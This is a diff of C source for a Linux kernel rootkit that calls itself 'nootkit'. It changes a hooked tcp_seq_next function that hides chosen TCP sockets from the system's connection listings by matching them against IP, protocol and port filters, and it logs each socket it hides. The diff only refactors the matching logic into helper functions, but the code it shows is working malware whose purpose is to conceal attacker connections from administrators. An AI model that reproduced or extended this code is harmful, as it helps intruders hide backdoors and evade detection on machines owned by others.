@@ -16,7 +16,7 @@ void *tcp_seq_next_hook(struct seq_file *seq, void *v, loff_t *pos)
 
     int i;
     struct sock *sock;
-    struct config_connection *filter;
+    struct config_netfilter *filter;
 
     /* original tcp_seq_next_hook code */
 
@@ -54,19 +54,10 @@ out:
         for (i = 0; i < hide_sockets_count; i++) {
             filter = &hide_sockets[i];
 
-            if ((NOOTKIT_TCP != filter->proto)
-                || (AF_INET != sock->sk_family)
-                || ((filter->local_ip & filter->local_ip_mask) != (sock->sk_rcv_saddr & filter->local_ip_mask))
-                || ((filter->foreign_ip & filter->foreign_ip_mask) != (sock->sk_daddr & filter->foreign_ip_mask))
-                || (!(
-                    /* sk_num is stored in host byte order, while sk_dport is always BE */
-                       (__le16_to_cpu(filter->local_port_start) <= sock->sk_num)
-                    && (__le16_to_cpu(filter->local_port_end) >= sock->sk_num)
-                ))
-                || (!(
-                       (__le16_to_cpu(filter->foreign_port_start) <= __be16_to_cpu(sock->sk_dport))
-                    && (__le16_to_cpu(filter->foreign_port_end) >= __be16_to_cpu(sock->sk_dport))
-                )))
+            if ((AF_INET != sock->sk_family)
+            || (!filter_ip(filter, (u8)sock->sk_protocol, sock->sk_rcv_saddr, sock->sk_daddr))
+            /* sk_num is stored in host byte order, while sk_dport is always BE */
+            || (!filter_transport(filter, __cpu_to_be16(sock->sk_num), sock->sk_dport)))
                 continue;
             
             printk(KERN_INFO "nootkit: Hiding TCP socket because of filter [%s]!", hide_sockets_strs[i]);
